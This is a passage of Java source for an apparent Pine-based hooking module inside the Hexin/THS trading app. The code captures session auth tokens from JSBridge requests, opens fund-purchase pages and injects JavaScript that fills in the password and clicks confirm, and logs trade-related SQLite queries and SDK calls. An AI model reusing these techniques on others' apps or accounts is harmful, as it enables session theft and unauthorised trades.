                    @Override
                    public void afterCall(Pine.CallFrame frame) {
                        try {
                            Object message = frame.args != null && frame.args.length > 0 ? frame.args[0] : null;
                            String handler = readStringField(message, "methodName");
                            String onlineId = readStringField(message, "onlineId");
                            Object implementation = frame.getResult();
                            String implementationClass = implementation == null
                                    ? "null"
                                    : implementation.getClass().getName();
                            Log.i(TAG, "JSBridge.resolve handler=" + handler
                                    + " onlineId=" + onlineId
                                    + " implementation=" + implementationClass);

                            if (implementation != null && isTargetMarketHandler(handler)) {
                                hookResolvedBridgeImplementation(implementation.getClass(), handler);
                            }
                        } catch (Throwable e) {
                            Log.w(TAG, "JSBridge resolver log failed: " + e.getMessage());
                        }
                    }
                });
                webViewBridgeResolverHooked = true;
                Log.i(TAG, "WebViewJavaScriptBridgePlus resolver hook installed");
            }

            if (!webViewBridgePluginCacheHooked) {
                Method cacheMethod = bridgeClass.getDeclaredMethod("addPluginInterfacesCache", java.util.Map.class);
                cacheMethod.setAccessible(true);
                Pine.hook(cacheMethod, new MethodHook() {
                    @Override
                    public void beforeCall(Pine.CallFrame frame) {
                        try {
                            Object mappings = frame.args != null && frame.args.length > 0 ? frame.args[0] : null;
                            Log.i(TAG, "JSBridge.pluginMappings " + describeBridgeMappings(mappings));
                        } catch (Throwable e) {
                            Log.w(TAG, "JSBridge plugin mapping log failed: " + e.getMessage());
                        }
                    }
                });
                webViewBridgePluginCacheHooked = true;
                Log.i(TAG, "WebViewJavaScriptBridgePlus plugin cache hook installed");
            }

            java.lang.reflect.Field cacheField = bridgeClass.getDeclaredField("mPluginInterfaceMappingCache");
            cacheField.setAccessible(true);
            Log.i(TAG, "JSBridge.currentPluginMappings " + describeBridgeMappings(cacheField.get(bridge)));
        } catch (Throwable e) {
            Log.w(TAG, "WebViewJavaScriptBridgePlus resolver hook failed: "
                    + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private static void hookResolvedBridgeImplementation(Class<?> implementationClass, String handler) {
        for (Class<?> current = implementationClass;
             current != null && current != Object.class;
             current = current.getSuperclass()) {
            for (Method method : current.getDeclaredMethods()) {
                if (!"onEventAction".equals(method.getName())) continue;

                String hookKey = method.toGenericString();
                if (hookedBridgeMethods.putIfAbsent(hookKey, true) != null) continue;

                try {
                    method.setAccessible(true);
                    final String resolvedHandler = handler;
                    Pine.hook(method, new MethodHook() {
                        @Override
                        public void beforeCall(Pine.CallFrame frame) {
                            StringBuilder sb = new StringBuilder("JSBridge.dispatch handler=")
                                    .append(resolvedHandler)
                                    .append(" implementation=")
                                    .append(implementationClass.getName())
                                    .append(" method=")
                                    .append(method.toGenericString())
                                    .append(" args=");
                            sb.append(describeArgs(frame.args, 6000));
                            Log.i(TAG, sb.toString());
                            Log.i(TAG, "JSBridge.dispatchStack " + compactStackTrace(18));
                        }
                    });
                    Log.i(TAG, "JSBridge implementation hook installed: " + hookKey);
                } catch (Throwable e) {
                    hookedBridgeMethods.remove(hookKey);
                    Log.w(TAG, "JSBridge implementation hook failed: " + hookKey + " " + e.getMessage());
                }
            }
        }
    }

    private static boolean isTargetMarketHandler(String handler) {
        return "UnifiedRequestBridge".equals(handler)
                || "realDataRequest".equals(handler)
                || "cancelRealDataRequest".equals(handler)
                || "clearRealdataRequest".equals(handler)
                || "hqMarketZdt".equals(handler);
    }

    private static String readStringField(Object target, String fieldName) {
        if (target == null) return null;
        try {
            java.lang.reflect.Field field = target.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            Object value = field.get(target);
            return value == null ? null : String.valueOf(value);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String describeBridgeMappings(Object value) {
        if (!(value instanceof java.util.Map)) return String.valueOf(value);
        StringBuilder sb = new StringBuilder("{");
        int count = 0;
        for (Object entryObject : ((java.util.Map<?, ?>) value).entrySet()) {
            java.util.Map.Entry<?, ?> entry = (java.util.Map.Entry<?, ?>) entryObject;
            if (count++ > 0) sb.append(", ");
            Object implementation = entry.getValue();
            sb.append(entry.getKey()).append("=")
                    .append(implementation == null ? "null" : implementation.getClass().getName());
            if (count >= 120) {
                sb.append(", ...");
                break;
            }
        }
        return sb.append("}").toString();
    }

    private static String describeArgs(Object[] args, int maxLength) {
        if (args == null) return "[]";
        StringBuilder sb = new StringBuilder("[");
        for (int i = 0; i < args.length; i++) {
            if (i > 0) sb.append(", ");
            Object arg = args[i];
            if (arg == null) {
                sb.append("null");
            } else if (arg instanceof android.webkit.WebView) {
                sb.append("WebView{").append(((android.webkit.WebView) arg).getUrl()).append("}");
            } else {
                sb.append(arg.getClass().getSimpleName()).append("{").append(arg).append("}");
            }
            if (sb.length() >= maxLength) {
                sb.setLength(maxLength);
                sb.append("...[truncated]");
                break;
            }
        }
        return sb.append("]").toString();
    }

    private static String compactStackTrace(int maxFrames) {
        StackTraceElement[] stack = Thread.currentThread().getStackTrace();
        StringBuilder sb = new StringBuilder();
        int written = 0;
        for (StackTraceElement frame : stack) {
            String className = frame.getClassName();
            if (className.equals(Thread.class.getName()) || className.equals(MainHook.class.getName())) continue;
            if (written++ > 0) sb.append(" <- ");
            sb.append(className).append(".").append(frame.getMethodName())
                    .append(":").append(frame.getLineNumber());
            if (written >= maxFrames) break;
        }
        return sb.toString();
    }

    /**
     * 从 JSBridge clientRequestHX 请求中提取认证参数
     */
    private static void extractAuthFromJSBridge(String json) {
        try {
            // 提取 Header 对象中的认证参数
            String[] authKeys = {"key1", "key2", "key3", "key4", "key5", "userId", "sessionId"};
            for (String key : authKeys) {
                // 查找 "key":"value" 模式
                String pattern = "\"" + key + "\":\"";
                int keyIdx = json.indexOf(pattern);
                if (keyIdx != -1) {
                    int valStart = keyIdx + pattern.length();
                    int valEnd = json.indexOf("\"", valStart);
                    if (valEnd > valStart) {
                        String value = json.substring(valStart, valEnd);
                        // 处理 JSON 转义
                        value = value.replace("\\u003d", "=");
                        if (value.length() > 0) {
                            switch (key) {
                                case "key1": latestKey1 = value; break;
                                case "key2": latestKey2 = value; break;
                                case "key3": latestKey3 = value; break;
                                case "key4": latestKey4 = value; break;
                                case "key5":
                                    latestKey5 = value;
                                    authCaptureTime = System.currentTimeMillis();
                                    break;
                                case "userId": latestUserId = value; break;
                                case "sessionId": latestSessionId = value; break;
                            }
                            Log.i(TAG, "Auth from JSBridge: " + key + "=" + (value.length() > 30 ? value.substring(0, 30) + "..." : value));
                        }
                    }
                }
            }
        } catch (Throwable e) {
            Log.w(TAG, "extractAuthFromJSBridge failed: " + e.getMessage());
        }
    }

    /**
     * 通过 WebView 触发基金购买
     */
    private static String triggerFundBuy(String body) {
        try {
            // 解析请求参数
            String fundCode = extractJsonString(body, "fundCode");
            String amountStr = extractJsonString(body, "amount");
            String password = extractJsonString(body, "password");

            if (fundCode == null || fundCode.isEmpty()) {
                return "{\"success\":false,\"error\":\"Missing fundCode\"}";
            }
            if (amountStr == null || amountStr.isEmpty()) {
                return "{\"success\":false,\"error\":\"Missing amount\"}";
            }

            Log.i(TAG, "Triggering fund buy: " + fundCode + " amount=" + amountStr);

            if (latestWebView == null) {
                return "{\"success\":false,\"error\":\"No WebView available\"}";
            }

            // 构造购买页面 URL
            String buyUrl = "https://trade.5ifund.com/hxapp/ifundBuyInit/dist/index.html?fundCode="
                + fundCode + "&amount=" + amountStr + "&transActionAccountId=600113970167";

            // 在主线程中打开购买页面
            final Object webView = latestWebView;
            new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    try {
                        // 方法1：直接加载 URL
                        webView.getClass().getMethod("loadUrl", String.class)
                            .invoke(webView, buyUrl);
                        Log.i(TAG, "Opened buy page: " + buyUrl);

                        // 方法2：如果提供了密码，延迟2秒后自动填充密码并提交
                        if (password != null && !password.isEmpty()) {
                            new android.os.Handler().postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    try {
                                        String js = "javascript:(function(){" +
                                            "var pwd=document.querySelector('input[type=password]');" +
                                            "if(pwd){pwd.value='" + password + "';}" +
                                            "var btn=document.querySelector('button.confirm');" +
                                            "if(btn){btn.click();}" +
                                            "})()";
                                        webView.getClass().getMethod("loadUrl", String.class)
                                            .invoke(webView, js);
                                        Log.i(TAG, "Auto-filled password and clicked confirm");
                                    } catch (Throwable e) {
                                        Log.e(TAG, "Auto-fill failed: " + e.getMessage());
                                    }
                                }
                            }, 2000);
                        }
                    } catch (Throwable e) {
                        Log.e(TAG, "loadUrl failed: " + e.getMessage());
                    }
                }
            });

            return "{\"success\":true,\"fundCode\":\"" + fundCode + "\",\"amount\":\"" + amountStr + "\"}";

        } catch (Throwable e) {
            Log.e(TAG, "triggerFundBuy failed", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    /**
     * 直接调用 App 内部的购买方法（不通过 UI 自动化）
     */
    private static String directBuyFund(String body) {
        Log.i(TAG, ">>> directBuyFund called");

        try {
            // 解析请求参数
            String fundCode = extractJsonString(body, "fundCode");
            String amountStr = extractJsonString(body, "amount");
            String password = extractJsonString(body, "password");

            if (fundCode == null || fundCode.isEmpty()) {
                return "{\"success\":false,\"error\":\"Missing fundCode\"}";
            }
            if (amountStr == null || amountStr.isEmpty()) {
                return "{\"success\":false,\"error\":\"Missing amount\"}";
            }

            Log.i(TAG, "Attempting direct buy: fundCode=" + fundCode + ", amount=" + amountStr);

            // 策略1: 尝试通过反射查找购买相关的类
            // 常见的包名模式: com.hexin.plat.android.fund.*, com.hexin.*.trade.*, 等
            String[] possiblePackages = {
                "com.hexin.plat.android.fund",
                "com.hexin.plat.android.trade",
                "com.hexin.fund",
                "com.hexin.trade",
                "com.ths.fund",
                "com.ths.trade"
            };

            // 常见的类名模式
            String[] possibleClassSuffixes = {
                ".FundBuyService",
                ".FundTradeService",
                ".TradeService",
                ".BuyService",
                ".SubscribeService",
                ".FundSubscribeService",
                ".manager.FundManager",
                ".manager.TradeManager",
                ".presenter.FundBuyPresenter",
                ".presenter.TradePresenter"
            };

            Class<?> targetClass = null;
            String foundClassName = null;

            // 尝试查找类
            for (String pkg : possiblePackages) {
                for (String suffix : possibleClassSuffixes) {
                    try {
                        String className = pkg + suffix;
                        targetClass = Class.forName(className);
                        foundClassName = className;
                        Log.i(TAG, ">>> Found candidate class: " + className);
                        break;
                    } catch (ClassNotFoundException ignored) {}
                }
                if (targetClass != null) break;
            }

            if (targetClass == null) {
                // 策略2: 如果有保存的JSBridge handler，尝试从中查找购买方法
                if (jsBridgeHandler != null) {
                    Log.i(TAG, ">>> Using captured JSBridge handler: " + jsBridgeHandler.getClass().getName());

                    // 枚举handler的所有方法，查找购买相关的方法
                    Method[] methods = jsBridgeHandler.getClass().getDeclaredMethods();
                    for (Method m : methods) {
                        String methodName = m.getName().toLowerCase();
                        if (methodName.contains("buy") || methodName.contains("subscribe") ||
                            methodName.contains("purchase") || methodName.contains("trade")) {
                            Log.i(TAG, ">>> Found potential buy method: " + m.getName() +
                                " params: " + java.util.Arrays.toString(m.getParameterTypes()));
                        }
                    }

                    return "{\"success\":false,\"error\":\"Found JSBridge handler but need manual method identification\",\"handler\":\"" +
                        jsBridgeHandler.getClass().getName() + "\"}";
                }

                return "{\"success\":false,\"error\":\"No suitable class or handler found. Need to capture JSBridge handler first by making a real purchase.\"}";
            }

            // 如果找到了类，枚举其方法
            Log.i(TAG, ">>> Enumerating methods of class: " + foundClassName);
            Method[] methods = targetClass.getDeclaredMethods();
            for (Method m : methods) {
                Log.i(TAG, "  Method: " + m.getName() + " params: " + java.util.Arrays.toString(m.getParameterTypes()));
            }

            return "{\"success\":false,\"error\":\"Class found but method invocation not yet implemented\",\"class\":\"" + foundClassName + "\"}";

        } catch (Throwable e) {
            Log.e(TAG, "directBuyFund failed", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\",\"stack\":\"" + Log.getStackTraceString(e) + "\"}";
        }
    }

    /**
     * 打开基金详情页面（触发WebView创建和JSBridge初始化）
     */
    private static String openFundDetail(String body) {
        Log.i(TAG, ">>> openFundDetail called");

        try {
            String fundCode = extractJsonString(body, "fundCode");
            if (fundCode == null || fundCode.isEmpty()) {
                return "{\"success\":false,\"error\":\"Missing fundCode\"}";
            }

            Log.i(TAG, "Opening fund detail page: " + fundCode);

            // 通过Intent打开基金详情页面
            // 同花顺的基金详情页面通常使用以下URI scheme:
            // "thshexin://web?url=https://trade.5ifund.com/hxapp/fund/detail?fundCode=xxx"
            // 或者直接通过Activity打开

            // 方法1: 尝试通过Intent打开
            new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    try {
                        // 获取当前的Application context
                        Class<?> atClass = Class.forName("android.app.ActivityThread");
                        Method currentApp = atClass.getDeclaredMethod("currentApplication");
                        android.app.Application app = (android.app.Application) currentApp.invoke(null);

                        if (app != null) {
                            // 创建Intent打开基金详情页面
                            android.content.Intent intent = new android.content.Intent();
                            intent.setAction(android.content.Intent.ACTION_VIEW);
                            intent.setData(android.net.Uri.parse("thshexin://web?url=https://trade.5ifund.com/hxapp/fund/detail?fundCode=" + fundCode));
                            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                            app.startActivity(intent);
                            Log.i(TAG, "Started fund detail activity via Intent");
                        }
                    } catch (Throwable e) {
                        Log.e(TAG, "Failed to open fund detail via Intent: " + e.getMessage());
                        e.printStackTrace();
                    }
                }
            });

            return "{\"success\":true,\"fundCode\":\"" + fundCode + "\",\"message\":\"Opening fund detail page\"}";

        } catch (Throwable e) {
            Log.e(TAG, "openFundDetail failed", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    /**
     * Hook SQLiteDatabase 操作，捕获股票交易数据存取
     */
    private static void hookSQLiteDatabase() throws Throwable {
        Class<?> dbClass = Class.forName("android.database.sqlite.SQLiteDatabase");

        // Hook openDatabase 捕获数据库实例
        try {
            for (Method m : dbClass.getDeclaredMethods()) {
                if ("openDatabase".equals(m.getName()) || "openOrCreateDatabase".equals(m.getName())) {
                    Pine.hook(m, new MethodHook() {
                        @Override
                        public void afterCall(Pine.CallFrame callFrame) {
                            Object db = callFrame.getResult();
                            if (db != null) {
                                try {
                                    Method getPath = db.getClass().getMethod("getPath");
                                    String path = (String) getPath.invoke(db);
                                    Log.i(TAG, "SQLite.open: " + path);
                                    // 捕获股票相关数据库
                                    // 优先 xcs2.db
                                    if (path != null && path.contains("xcs2")) {
                                        stockDatabase = db;
                                        Log.i(TAG, "Stock database captured (xcs2): " + path);
                                    } else if (stockDatabase == null && path != null && (path.contains("weituo")
                                        || path.contains("xcs") || path.contains("stock") || path.contains("trade"))) {
                                        stockDatabase = db;
                                        Log.i(TAG, "Stock database captured: " + path);
                                    }
                                } catch (Throwable e) {
                                    Log.w(TAG, "getPath failed: " + e.getMessage());
                                }
                            }
                        }
                    });
                }
            }
        } catch (Throwable e) {
            Log.w(TAG, "SQLite openDatabase hook failed: " + e.getMessage());
        }

        // Hook execSQL - 用于 INSERT/UPDATE/DELETE
        try {
            Method execSQL = dbClass.getDeclaredMethod("execSQL", String.class);
            Pine.hook(execSQL, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    // 捕获数据库实例
                    Object db = callFrame.thisObject;
                    if (stockDatabase == null && db != null) {
                        try {
                            Method getPath = db.getClass().getMethod("getPath");
                            String path = (String) getPath.invoke(db);
                            if (path != null && (path.contains("weituo") || path.contains("xcs")
                                || path.contains("stock") || path.contains("trade"))) {
                                stockDatabase = db;
                                Log.i(TAG, "Stock database captured from execSQL: " + path);
                            }
                        } catch (Throwable ignored) {}
                    }

                    String sql = (String) callFrame.args[0];
                    // 只记录交易相关的表操作
                    if (sql != null && (sql.contains("stock_") || sql.contains("position") || sql.contains("entrust")
                        || sql.contains("trans") || sql.contains("asset") || sql.contains("money") || sql.contains("order"))) {
                        Log.i(TAG, "SQLite.execSQL: " + sql.substring(0, Math.min(500, sql.length())));
                    }
                }
            });
        } catch (Throwable e) {
            Log.w(TAG, "SQLite execSQL hook failed: " + e.getMessage());
        }

        // Hook execSQL with bind args
        try {
            Method execSQLArgs = dbClass.getDeclaredMethod("execSQL", String.class, Object[].class);
            Pine.hook(execSQLArgs, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    String sql = (String) callFrame.args[0];
                    Object[] args = (Object[]) callFrame.args[1];
                    if (sql != null && (sql.contains("stock_") || sql.contains("position") || sql.contains("entrust")
                        || sql.contains("trans") || sql.contains("asset") || sql.contains("money") || sql.contains("order"))) {
                        Log.i(TAG, "SQLite.execSQL: " + sql.substring(0, Math.min(300, sql.length()))
                            + " args=" + java.util.Arrays.toString(args));
                    }
                }
            });
        } catch (Throwable e) {
            Log.w(TAG, "SQLite execSQL(args) hook failed: " + e.getMessage());
        }

        // Hook rawQuery - 用于 SELECT
        try {
            Method rawQuery = dbClass.getDeclaredMethod("rawQuery", String.class, String[].class);
            Pine.hook(rawQuery, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    String sql = (String) callFrame.args[0];
                    String[] args = (String[]) callFrame.args[1];
                    if (sql != null && (sql.contains("stock_") || sql.contains("position") || sql.contains("entrust")
                        || sql.contains("trans") || sql.contains("asset") || sql.contains("money") || sql.contains("order"))) {
                        Log.i(TAG, "SQLite.rawQuery: " + sql.substring(0, Math.min(300, sql.length()))
                            + " args=" + java.util.Arrays.toString(args));
                    }
                }
            });
        } catch (Throwable e) {
            Log.w(TAG, "SQLite rawQuery hook failed: " + e.getMessage());
        }

        // Hook insert
        try {
            Method insert = dbClass.getDeclaredMethod("insert", String.class, String.class,
                Class.forName("android.content.ContentValues"));
            Pine.hook(insert, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    String table = (String) callFrame.args[0];
                    if (table != null && (table.contains("stock") || table.contains("position") || table.contains("entrust")
                        || table.contains("trans") || table.contains("asset") || table.contains("money") || table.contains("order"))) {
                        Object values = callFrame.args[2];
                        String valStr = values != null ? values.toString() : "null";
                        if (valStr.length() > 500) valStr = valStr.substring(0, 500) + "...";
                        Log.i(TAG, "SQLite.insert: table=" + table + " values=" + valStr);
                    }
                }
            });
        } catch (Throwable e) {
            Log.w(TAG, "SQLite insert hook failed: " + e.getMessage());
        }

        // Hook update
        try {
            Method update = dbClass.getDeclaredMethod("update", String.class,
                Class.forName("android.content.ContentValues"), String.class, String[].class);
            Pine.hook(update, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    String table = (String) callFrame.args[0];
                    if (table != null && (table.contains("stock") || table.contains("position") || table.contains("entrust")
                        || table.contains("trans") || table.contains("asset") || table.contains("money") || table.contains("order"))) {
                        Object values = callFrame.args[1];
                        String where = (String) callFrame.args[2];
                        String valStr = values != null ? values.toString() : "null";
                        if (valStr.length() > 300) valStr = valStr.substring(0, 300) + "...";
                        Log.i(TAG, "SQLite.update: table=" + table + " values=" + valStr + " where=" + where);
                    }
                }
            });
        } catch (Throwable e) {
            Log.w(TAG, "SQLite update hook failed: " + e.getMessage());
        }

        Log.i(TAG, "SQLite hooks installed");
    }

    // 捕获的 MasterModuleBridge 实例，用于发起交易
    private static volatile Object masterModuleBridgeInstance = null;
    private static volatile Method masterModuleBridgeRequestMethod = null;

    // WTBuyConfirmClient: 买入入口类
    private static volatile Object wtBuyConfirmClientInstance = null;
    private static volatile Class<?> wtBuyConfirmClientClass = null;
    private static volatile Method wtBuyRequestDirectMethod = null;
    // 存储创建 WTBuyConfirmClient 需要的依赖（从 Hook 中捕获）
    private static volatile Object capturedWTContext = null;  // 可能需要的 Context 或其他依赖

    // 交易日志缓存（最近 100 条）
    private static final List<String> recentTradeLogs = java.util.Collections.synchronizedList(new java.util.LinkedList<String>() {
        @Override
        public boolean add(String e) {
            if (size() >= 100) {
                removeFirst();
            }
            return super.add(e);
        }
    });

    private static void addTradeLog(String log) {
        String timestamp = new java.text.SimpleDateFormat("HH:mm:ss.SSS").format(new java.util.Date());
        recentTradeLogs.add(timestamp + " " + log);
    }

    /**
     * Hook 股票交易 SDK（可重试部分）：MasterModuleBridge 是 libweituo.so 唯一引用的
     * Java 入口。日志只记录结构（类型/长度/命令名），不记录业务值。
     *
     * 重要：Pine.hook 内部的 Method.invoke 会强制执行该类 <clinit>。若 App 上下文
     * 尚未就绪，clinit 抛 "context must not be null"，类被 ART 标记为 erroneous，
     * App 之后自己使用时会 NoClassDefFoundError 崩溃（已实测）。因此本方法只能由
     * 延迟重试（App 启动完成后）或 F(119) 事件（交易模块活跃）触发，绝不能在
     * installAllHooks 里直接调用。
     */
    private static synchronized void hookTradingSdkBridge(ClassLoader cl) {
        if (tradingSdkBridgeHooked.get()) return;
        thsAppClassLoader = cl;

        Class<?> bridgeClass;
        try {
            bridgeClass = cl.loadClass("com.hexin.android.mastermodule.MasterModuleBridge");
        } catch (ClassNotFoundException e) {
            Log.w(TAG, "MasterModuleBridge not found in this classLoader");
            return;
        }

        // 就绪检查：r9h.d 是 MasterModule 初始化完成标志（r9h.l 设置上下文后，
        // initMasterModule 成功才置 true）。读它只触发 r9h 的平凡 clinit，安全；
        // 而 MasterModuleBridge 此时必然已完成初始化，Pine.hook 不会再触发失败
        // 的 <clinit>。
        try {
            Class<?> r9h = cl.loadClass("r9h");
            java.lang.reflect.Field initFlag = r9h.getDeclaredField("d");
            initFlag.setAccessible(true);
            if (!(boolean) initFlag.get(null)) {
                Log.i(TAG, "MasterModule not initialized yet (r9h.d=false), skip hook attempt");
                return;
            }
            Log.i(TAG, "MasterModule initialized (r9h.d=true), safe to hook");
        } catch (Throwable e) {
            Log.w(TAG, "r9h ready-check unavailable: " + e + " — skip hook attempt");
            return;
        }

        // 挂钩请求入口 r9h.o(byte[])：this.j().jniRequest(f(), bArr)
        try {
            Class<?> r9h = cl.loadClass("r9h");
            Method sendMethod = r9h.getDeclaredMethod("o", byte[].class);
            sendMethod.setAccessible(true);
            Pine.hook(sendMethod, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    String logMsg = "TradeSend.r9h.o args=" + describeTradeArguments(callFrame.args);
                    Log.i(TAG, logMsg);
                    addTradeLog(logMsg);
                }
            });
            Log.i(TAG, "r9h.o request-entry hook installed");
        } catch (Throwable e) {
            Log.w(TAG, "r9h.o hook failed: " + e.getMessage());
        }

        // 响应分发枢纽：native → receive → CommunicationService.notifyDataReceived
        // → hrv.b（SocketConnectionPool 帧解析）→ 页面观察者
        try {
            Class<?> commSvc = cl.loadClass("com.hexin.plat.android.CommunicationService");
            Method notify = commSvc.getDeclaredMethod("notifyDataReceived",
                    byte[].class, int.class, int.class);
            notify.setAccessible(true);
            Pine.hook(notify, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    String logMsg = "TradeRecv.notifyDataReceived args="
                            + describeTradeArguments(callFrame.args);
                    Log.i(TAG, logMsg);
                    addTradeLog(logMsg);
                }
            });
            Log.i(TAG, "notifyDataReceived dispatch hook installed");
        } catch (Throwable e) {
            Log.w(TAG, "notifyDataReceived hook failed: " + e.getMessage());
        }

        // 查询构建器 rpv：G(pageId, protocolId, callback, extJson)/H(...)/D(key, value)
        // 是所有交易查询的统一入口（sxh/pxm 等页面客户端全部经过）。只记录
        // pageId/protocolId/参数键名与值类型，不记录值。
        try {
            Class<?> rpvClass = cl.loadClass("rpv");
            Method gMethod = rpvClass.getDeclaredMethod("G", int.class, int.class, int.class, String.class);
            gMethod.setAccessible(true);
            Pine.hook(gMethod, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    String logMsg = "TradeQuery.G pageId=" + callFrame.args[0]
                            + " protocolId=" + callFrame.args[1]
                            + " observer=" + callFrame.args[2]
                            + " ext=" + describeTradeValue(callFrame.args[3]);
                    Log.i(TAG, logMsg);
                    addTradeLog(logMsg);
                    Object protoArg = callFrame.args[1];
                    if (protoArg instanceof Integer && callFrame.args[3] instanceof String) {
                        int proto = (Integer) protoArg;
                        capturedQueryPageIds.put(proto,
                                new int[]{(Integer) callFrame.args[0], proto});
                        capturedQueryParams.put(proto, (String) callFrame.args[3]);
                    }
                }
            });
            Class<?> imvClass = cl.loadClass("imv");
            Method hMethod = rpvClass.getDeclaredMethod("H", int.class, int.class, imvClass, String.class);
            hMethod.setAccessible(true);
            Pine.hook(hMethod, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    String logMsg = "TradeQuery.H pageId=" + callFrame.args[0]
                            + " protocolId=" + callFrame.args[1]
                            + " params=" + describeTradeValue(callFrame.args[3]);
                    Log.i(TAG, logMsg);
                    addTradeLog(logMsg);
                    Object protoArg = callFrame.args[1];
                    if (protoArg instanceof Integer && callFrame.args[3] instanceof String) {
                        int proto = (Integer) protoArg;
                        capturedQueryPageIds.put(proto,
                                new int[]{(Integer) callFrame.args[0], proto});
                        capturedQueryParams.put(proto, (String) callFrame.args[3]);
                    }
                }
            });
            Method dMethod = rpvClass.getDeclaredMethod("D", String.class, Object.class);
            dMethod.setAccessible(true);
            Pine.hook(dMethod, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    String key = (String) callFrame.args[0];
                    String valueShape = key + ":" + describeTradeValue(callFrame.args[1]);
                    Log.i(TAG, "TradeQuery.D param=" + valueShape);
                    addTradeLog("TradeQuery.D param=" + valueShape);
                }
            });
            Log.i(TAG, "rpv query-builder hooks installed");
        } catch (Throwable e) {
            Log.w(TAG, "rpv query-builder hook failed: " + e.getMessage());
        }

        // 响应观察者有两套独立体系，都挂上：
        // 1) ixm（sxh/fyh/rtl 继承）：receive → 抽象 a(StuffBaseStruct)
        // 2) nxm implements jmv（pxm 当日委托等的父类）：自带 receive，内部按
        //    c=pageId/d=protocolId 分发，StuffTableStruct → Handler → i() 解析
        // 记录观察者类名与响应 schema：pageId/frameId、tableHead 列名、行数列数
        // ——不记录单元格值。
        try {
            Class<?> stuffBaseClass = cl.loadClass("com.hexin.middleware.data.StuffBaseStruct");
            Method receiveMethod = cl.loadClass("ixm").getDeclaredMethod("receive", stuffBaseClass);
            receiveMethod.setAccessible(true);
            Pine.hook(receiveMethod, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    String logMsg = "TradeResp.ixm observer="
                            + (callFrame.thisObject == null ? "static" : callFrame.thisObject.getClass().getName())
                            + " stuff=" + describeStuffStruct(callFrame.args[0]);
                    Log.i(TAG, logMsg);
                    addTradeLog(logMsg);
                }
            });
            Log.i(TAG, "ixm.receive response-observer hook installed");

            Class<?> nxmClass = cl.loadClass("nxm");
            Method nxmReceive = nxmClass.getDeclaredMethod("receive", stuffBaseClass);
            nxmReceive.setAccessible(true);
            Pine.hook(nxmReceive, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    String logMsg = "TradeResp.nxm observer="
                            + (callFrame.thisObject == null ? "static" : callFrame.thisObject.getClass().getName())
                            + describeObserverIds(callFrame.thisObject)
                            + " stuff=" + describeStuffStruct(callFrame.args[0]);
                    Log.i(TAG, logMsg);
                    addTradeLog(logMsg);
                }
            });
            Log.i(TAG, "nxm.receive response-observer hook installed");
        } catch (Throwable e) {
            Log.w(TAG, "response-observer hook failed: " + e.getMessage());
        }

        boolean anyFailure = false;
        Log.i(TAG, "Found MasterModuleBridge class!");
        for (Method m : bridgeClass.getDeclaredMethods()) {
            String methodName = m.getName();
            Log.i(TAG, "MasterModuleBridge method: " + methodName + " params=" + java.util.Arrays.toString(m.getParameterTypes()));

            if (methodName.equals("hashCode") || methodName.equals("equals")
                || methodName.equals("toString") || methodName.equals("getClass")) {
                continue;
            }

            try {
                Pine.hook(m, new MethodHook() {
                    @Override
                    public void beforeCall(Pine.CallFrame callFrame) {
                        if (masterModuleBridgeInstance == null && callFrame.thisObject != null) {
                            masterModuleBridgeInstance = callFrame.thisObject;
                            Log.i(TAG, "MasterModuleBridge instance captured!");
                        }

                        String logMsg = "MasterBridge." + methodName
                                + " args=" + describeTradeArguments(callFrame.args);
                        Log.i(TAG, logMsg);
                        addTradeLog("REQ: " + logMsg);

                        if (methodName.equals("jniRequest")) {
                            Log.i(TAG, "=== jniRequest CALL STACK ===");
                            Throwable t = new Throwable();
                            for (StackTraceElement e : t.getStackTrace()) {
                                String cn = e.getClassName();
                                // 默认包的混淆短名类（无 '.'）正是查询 API 所在层，
                                // 必须保留；排除自身与 Pine 框架
                                boolean defaultPkg = !cn.contains(".");
                                if (cn.contains("hexin") || cn.contains("weituo")
                                        || (defaultPkg && !cn.startsWith("com.")
                                            && !cn.startsWith("java")
                                            && !cn.startsWith("top.canyie"))) {
                                    Log.i(TAG, "  -> " + cn + "." + e.getMethodName() + ":" + e.getLineNumber());
                                }
                            }
                            Log.i(TAG, "=== END STACK ===");
                        }
                    }

                    @Override
                    public void afterCall(Pine.CallFrame callFrame) {
                        String logMsg = "RSP: " + methodName + " result="
                                + describeTradeValue(callFrame.getResult());
                        Log.i(TAG, logMsg);
                        addTradeLog(logMsg);
                    }
                });
            } catch (Throwable e) {
                anyFailure = true;
                Log.e(TAG, "MasterModuleBridge hook failed on " + methodName
                        + " (class init not ready; will retry later)", e);
                if (e instanceof ExceptionInInitializerError
                        || e instanceof NoClassDefFoundError
                        || e.getCause() instanceof ExceptionInInitializerError) {
                    break;
                }
                continue;
            }

            if (methodName.contains("request") || methodName.contains("Request")
                || methodName.contains("send") || methodName.contains("Send")
                || methodName.contains("call") || methodName.contains("Call")) {
                if (masterModuleBridgeRequestMethod == null) {
                    masterModuleBridgeRequestMethod = m;
                    Log.i(TAG, "MasterModuleBridge request method captured: " + methodName);
                }
            }
        }

        if (!anyFailure) {
            tradingSdkBridgeHooked.set(true);
